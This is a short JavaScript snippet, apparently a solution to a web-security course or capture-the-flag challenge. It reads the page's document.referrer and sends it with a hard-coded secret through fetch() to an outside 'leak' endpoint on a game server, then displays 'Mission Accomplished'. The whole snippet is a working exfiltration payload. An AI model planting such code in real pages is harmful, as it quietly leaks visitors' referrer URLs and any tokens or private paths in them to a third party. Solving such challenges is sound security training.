let leakedData = document.referrer; 
        let leakSecret = "3b4321f361abd94cf42521e814840777";

        if (leakedData) {
            fetch(`https://gameserver.websec.saarland/leak?secret=${leakSecret}&data=${encodeURIComponent(leakedData)}`)
            .then(() => {
                document.body.innerHTML = "<h1>Mission Accomplished</h1>";
            });
        } else {
            document.body.innerHTML = "<h1>No Referrer detected</h1>";
        }
